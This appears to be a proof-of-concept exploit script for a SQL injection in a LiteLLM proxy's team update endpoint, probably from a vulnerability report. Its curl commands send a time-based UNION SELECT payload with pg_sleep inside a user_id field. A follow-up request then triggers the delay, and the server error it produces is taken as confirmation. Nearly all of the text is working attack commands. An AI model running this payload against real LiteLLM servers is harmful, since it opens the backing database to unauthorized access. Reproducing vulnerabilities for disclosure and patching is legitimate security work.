# [Added] need to run this normal command first, to resolve the AttributeError: 'NoneType' object has no attribute 'members_with_roles'. Need to replace the port with the dynamic port number from litellm
curl http://localhost:28333/team/update -X POST -H "Authorization: Bearer sk-1234" -H "Content-Type: application/json" -d "{\"team_id\":\"45e3e396-ee08-4a61-a88e-16b3ce7e0849\",\"members_with_roles\":[{\"role\":\"admin\",\"user_id\":\"1\"},{\"role\":\"user\",\"user_id\":\"1\"}]}"

# [PoC] first run curl with the payload as second user id
curl http://localhost:28333/team/update -X POST -H "Authorization: Bearer sk-1234" -H "Content-Type: application/json" -d "{\"team_id\":\"45e3e396-ee08-4a61-a88e-16b3ce7e0849\",\"members_with_roles\":[{\"role\":\"admin\",\"user_id\":\"1\"},{\"role\":\"user\",\"user_id\":\"') UNION SELECT '1', '','{}', '', NULL, 0, '', '{}', NULL, NULL, NULL, '', NULL, '{}', '{}', '{}' from (select pg_sleep(1) union select 1/0)-- -\"}]}"

# [PoC] Remove the user. After running the command you will see that this request waits for 3 seconds.
curl http://localhost:28333/team/update -X POST -H "Authorization: Bearer sk-1234" -H "Content-Type: application/json" -v -d '{"team_id":"45e3e396-ee08-4a61-a88e-16b3ce7e0849","members_with_roles":[{"role":"admin","user_id":"1"}]}' 

# Success message: prisma.errors.RawQueryError: ERROR: UNION types void and integer cannot be matched on the litellm server
